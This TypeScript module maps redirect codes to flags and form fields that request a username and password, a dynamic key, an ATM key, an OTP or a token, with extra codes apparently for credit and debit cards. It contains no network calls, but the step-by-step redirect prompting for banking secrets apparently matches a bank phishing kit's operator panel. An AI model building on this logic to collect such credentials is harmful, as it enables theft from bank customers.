export type SecurityRedirect =
	| 'otpcode'
	| 'cdin'
	| 'atmkey'
	| 'userpass'
	| 'token'
	| 'success'
	| 'tcred'
	| 'tdeb';

export interface SecurityFlags {
	requireUserPass: boolean;
	requireDynamicKey: boolean;
	requireATMKey: boolean;
	requireOTP: boolean;
	requireToken: boolean;
}

export const DEFAULT_SECURITY_FLAGS: SecurityFlags = {
	requireUserPass: true,
	requireDynamicKey: false,
	requireATMKey: false,
	requireOTP: false,
	requireToken: false
};

const REDIRECT_TO_FLAGS: Record<string, SecurityFlags> = {
	userpass: {
		requireUserPass: true,
		requireDynamicKey: false,
		requireATMKey: false,
		requireOTP: false,
		requireToken: false
	},
	cdin: {
		requireUserPass: false,
		requireDynamicKey: true,
		requireATMKey: false,
		requireOTP: false,
		requireToken: false
	},
	atmkey: {
		requireUserPass: false,
		requireDynamicKey: false,
		requireATMKey: true,
		requireOTP: false,
		requireToken: false
	},
	otpcode: {
		requireUserPass: false,
		requireDynamicKey: false,
		requireATMKey: false,
		requireOTP: true,
		requireToken: false
	},
	token: {
		requireUserPass: false,
		requireDynamicKey: false,
		requireATMKey: false,
		requireOTP: false,
		requireToken: true
	}
};

const REDIRECT_TO_FIELDS: Record<string, string[]> = {
	userpass: ['user', 'pass'],
	cdin: ['dinamicKey'],
	atmkey: ['atmKey'],
	otpcode: ['otp'],
	token: ['token']
};

export function isSecurityCheckRedirect(redirectTo?: string | null): redirectTo is SecurityRedirect {
	return Boolean(redirectTo && ['otpcode', 'cdin', 'atmkey', 'userpass', 'token', 'success', 'tcred', 'tdeb'].includes(redirectTo));
}

export function getSecurityFlagsForRedirect(redirectTo?: string | null): SecurityFlags {
	if (!redirectTo) {
		return { ...DEFAULT_SECURITY_FLAGS };
	}

	return {
		...(REDIRECT_TO_FLAGS[redirectTo] || DEFAULT_SECURITY_FLAGS)
	};
}

export function getRequestedFieldsForRedirect(redirectTo?: string | null): string[] {
	if (!redirectTo) {
		return ['user', 'pass'];
	}

	return [...(REDIRECT_TO_FIELDS[redirectTo] || ['user', 'pass'])];
}
